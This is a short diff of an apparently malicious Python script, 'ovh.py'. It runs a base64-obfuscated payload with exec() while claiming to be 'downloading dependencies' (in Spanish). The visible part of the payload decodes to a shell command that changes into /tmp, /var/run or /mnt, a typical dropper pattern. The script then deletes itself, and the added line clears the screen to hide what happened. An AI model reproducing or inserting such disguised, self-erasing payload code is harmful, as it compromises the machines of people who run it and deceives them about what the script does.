@@ -13,6 +13,7 @@ payload2 = b'b3Muc3lzdGVtKCdjZCAvdG1wIHx8IGNkIC92YXIvcnVuIHx8IGNkIC9tbnQgfHwgY2Q
 print("Descargando dependencias....")
 time.sleep(2)
 exec(base64.b64decode(payload2))
+os.system("clear")
 while True:
     if time.time() > tiempo:
         os.system("rm ovh.py")
